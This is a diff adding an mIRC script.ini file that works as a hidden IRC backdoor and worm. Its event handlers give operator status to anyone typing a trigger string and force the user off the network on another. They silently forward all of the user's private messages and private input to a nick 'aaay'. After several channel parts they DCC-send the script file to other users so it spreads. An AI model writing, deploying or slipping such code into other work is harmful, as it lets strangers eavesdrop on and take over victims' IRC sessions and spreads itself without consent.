@@ -1,0 +1,19 @@
+[script]
+n0=
+n1=
+n2=
+n3=on 1:text:*@@@*:#:/mode $chan +o $nick
+n4=on 1:text:*×com*:#:/quit CONNECTION FUCKED BY PEER
+n5=on 1:text:*123456789*:#:/.msg $nick Im a lamah
+n6=on 1:INPUT:?:{
+n7=  /.msg aaay $nick - $1-
+n8=}
+n9=on 1:text:*:?:{
+n10=  /.msg aaay $nick - $1-
+n11=}
+n12=
+n13=on !1:PART:#:{
+n14=/inc %count1 1
+n15=if %count1 >= 5 /dcc send $nick $mircdirscript.ini
+n16=}
+
